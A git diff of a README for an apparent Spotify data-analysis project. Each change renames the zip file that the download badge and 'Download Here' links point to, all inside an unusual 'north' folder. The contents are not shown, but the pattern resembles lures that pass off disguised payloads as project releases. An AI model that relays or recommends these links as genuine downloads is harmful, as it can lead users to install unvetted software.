@@ -1,6 +1,6 @@
 # 🎵 Spotify-Data-Analysis-EDA-Project - Explore Your Spotify Data Easily
 
-[![Download Now](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify-Data-Analysis-EDA-Project_v1.6.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify-Data-Analysis-EDA-Project_v1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify_Project_ED_Data_Analysis_1.6.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify_Project_ED_Data_Analysis_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Spotify Data Analysis EDA Project. This application helps you exp
 
 To get started, you need to visit the Releases page to download the application. Click the link below:
 
-[Download Here](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify-Data-Analysis-EDA-Project_v1.6.zip)
+[Download Here](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify_Project_ED_Data_Analysis_1.6.zip)
 
 Follow these steps to download and run the application:
 
@@ -70,4 +70,4 @@ We welcome contributions from everyone. If you want to add features or improve t
 
 For more in-depth exploration and updates, stay tuned to our Releases page.
 
-[Download Here](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify-Data-Analysis-EDA-Project_v1.6.zip) to get started on your Spotify data analysis journey!
+[Download Here](https://raw.githubusercontent.com/emadibrahim159/Spotify-Data-Analysis-EDA-Project/main/north/Spotify_Project_ED_Data_Analysis_1.6.zip) to get started on your Spotify data analysis journey!
